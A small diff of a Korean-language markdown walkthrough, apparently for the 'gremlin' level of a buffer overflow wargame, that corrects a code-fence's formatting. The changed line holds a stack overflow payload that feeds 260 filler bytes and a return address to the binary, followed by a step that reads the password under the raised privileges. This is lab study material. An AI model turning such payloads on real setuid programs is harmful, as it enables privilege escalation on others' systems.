@@ -46,6 +46,6 @@ buffer에서 ebp까지의 거리가 256이라는 것이다.<br>
 *(주소는 little endian 방식으로 입력된다)*<br>
 <br>
 **공격 실시!**<br>
-```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'````<br>
+```../gremlin `python -c 'print "A"*260+"\x25\xfd\xff\xbf"'` ```<br>
 ```my-pass```로 비밀번호를 물어보면<br>
 euid와 함께 비밀번호가 "~~". 라고 나올 것이다!!
